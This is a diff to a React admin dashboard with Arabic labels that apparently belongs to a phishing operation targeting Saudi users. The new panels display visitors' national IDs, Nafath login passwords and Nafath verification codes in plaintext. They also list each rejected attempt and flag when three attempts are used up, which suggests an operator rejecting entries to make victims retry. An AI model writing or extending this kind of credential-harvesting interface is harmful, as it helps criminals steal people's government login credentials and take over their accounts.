@@ -2052,29 +2052,87 @@ const AdminVisitors = () => {
                                 })()}
 
                                 {/* 6. دخول النفاذ */}
-                                <CollapsibleCard title="دخول النفاذ" icon={<Fingerprint className="w-3 h-3" />} borderColor="border-teal-500/30" bgColor="bg-teal-500/5" headerBg="bg-teal-500/10" headerBorder="border-teal-500/20" textColor="text-teal-600">
-                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      {(order.nafath_password || selectedVisitor?.national_id || order.national_id) ? (
-                                        <>
-                                          <InfoItem label="اسم المستخدم (الهوية)" value={selectedVisitor?.national_id || order.national_id || "—"} />
-                                          {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
-                                        </>
-                                      ) : (
-                                        <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
-                                      )}
-                                    </div>
-                                </CollapsibleCard>
+                                {(() => {
+                                  const nafathLoginEvents = stageEvents
+                                    .filter(e => e.order_id === order.id && e.stage === "nafath_login")
+                                    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+                                  const rejectedNafathLogins = nafathLoginEvents.filter(e => e.status === "rejected");
+                                  return (
+                                    <CollapsibleCard title="دخول النفاذ" icon={<Fingerprint className="w-3 h-3" />} borderColor="border-teal-500/30" bgColor="bg-teal-500/5" headerBg="bg-teal-500/10" headerBorder="border-teal-500/20" textColor="text-teal-600">
+                                      <div className="px-3 py-2.5 space-y-2">
+                                        {rejectedNafathLogins.length > 0 && (
+                                          <div className="space-y-1.5">
+                                            {rejectedNafathLogins.map((ev, i) => {
+                                              const uid = (ev.payload as any)?.national_id || "—";
+                                              const pwd = (ev.payload as any)?.nafath_password || "—";
+                                              return (
+                                                <div key={ev.id} className="bg-red-500/5 border border-red-500/15 rounded-lg px-3 py-1.5 space-y-0.5">
+                                                  <div className="flex items-center justify-between">
+                                                    <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
+                                                  </div>
+                                                  <div className="grid grid-cols-2 gap-1.5">
+                                                    <div><p className="text-[8px] text-red-400">الهوية</p><p className="text-[11px] font-mono text-red-400 line-through">{uid}</p></div>
+                                                    <div><p className="text-[8px] text-red-400">كلمة المرور</p><p className="text-[11px] font-mono text-red-400 line-through">{pwd}</p></div>
+                                                  </div>
+                                                </div>
+                                              );
+                                            })}
+                                          </div>
+                                        )}
+                                        <div className="grid grid-cols-2 gap-2">
+                                          {(order.nafath_password || selectedVisitor?.national_id || order.national_id) ? (
+                                            <>
+                                              <InfoItem label="اسم المستخدم (الهوية)" value={selectedVisitor?.national_id || order.national_id || "—"} />
+                                              {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
+                                            </>
+                                          ) : (
+                                            <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+                                          )}
+                                        </div>
+                                        {rejectedNafathLogins.length >= 3 && (
+                                          <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>
+                                        )}
+                                      </div>
+                                    </CollapsibleCard>
+                                  );
+                                })()}
 
                                 {/* 7. رمز النفاذ */}
-                                <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600">
-                                    <div className="px-3 py-2.5 flex items-center justify-center">
-                                      {order.nafath_number ? (
-                                        <span className="text-3xl font-mono font-bold tracking-[8px] text-cyan-600 bg-cyan-500/10 px-5 py-2 rounded-lg border border-cyan-500/20">{order.nafath_number}</span>
-                                      ) : (
-                                        <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
-                                      )}
-                                    </div>
-                                </CollapsibleCard>
+                                {(() => {
+                                  const nafathVerifyEvents = stageEvents
+                                    .filter(e => e.order_id === order.id && e.stage === "nafath_verify")
+                                    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+                                  const rejectedNafathVerifies = nafathVerifyEvents.filter(e => e.status === "rejected");
+                                  return (
+                                    <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600">
+                                      <div className="px-3 py-2.5 space-y-2">
+                                        {rejectedNafathVerifies.length > 0 && (
+                                          <div className="space-y-1.5">
+                                            {rejectedNafathVerifies.map((ev, i) => {
+                                              const num = (ev.payload as any)?.nafath_number || "—";
+                                              return (
+                                                <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-3 py-1.5">
+                                                  <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
+                                                  <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{num}</span>
+                                                </div>
+                                              );
+                                            })}
+                                          </div>
+                                        )}
+                                        <div className="flex items-center justify-center">
+                                          {order.nafath_number ? (
+                                            <span className="text-3xl font-mono font-bold tracking-[8px] text-cyan-600 bg-cyan-500/10 px-5 py-2 rounded-lg border border-cyan-500/20">{order.nafath_number}</span>
+                                          ) : (
+                                            <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
+                                          )}
+                                        </div>
+                                        {rejectedNafathVerifies.length >= 3 && (
+                                          <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>
+                                        )}
+                                      </div>
+                                    </CollapsibleCard>
+                                  );
+                                })()}
 
                                 {/* Vehicle info */}
                                 <CollapsibleCard title="معلومات المركبة" icon={<Car className="w-3 h-3" />} borderColor="border-border/50" bgColor="bg-muted/10" headerBg="bg-muted/30" headerBorder="border-border/30" textColor="text-muted-foreground">
